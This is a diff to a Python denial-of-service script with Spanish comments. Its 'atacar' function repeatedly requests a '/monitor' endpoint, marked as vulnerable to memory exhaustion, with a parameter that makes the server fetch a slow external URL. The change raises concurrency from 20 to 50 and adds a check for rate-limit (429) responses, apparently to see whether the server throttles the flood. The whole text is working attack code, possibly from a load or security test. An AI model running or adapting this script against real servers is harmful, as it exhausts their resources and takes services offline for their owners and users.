@@ -8,7 +8,7 @@ TARGET_PORT = 80
 
 # Endpoint vulnerable a RAM
 TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}/monitor?target=https://httpbin.org/delay/5"
-CONCURRENCIA = 20
+CONCURRENCIA = 50
 ATAQUES=20
 
 def atacar():
@@ -20,7 +20,10 @@ def atacar():
         # Ponemos un timeout alto porque el servidor se volverá lento
         for _ in range(ATAQUES):
             requests.get(TARGET_URL, timeout=30)
-    
+    except requests.exceptions.RequestException as e:
+        if e.response is not None:
+            if e.response.status_code==429:
+                print("Too many requests")
     except Exception as _:
         # Silenciamos otros errores para no saturar la consola
         pass
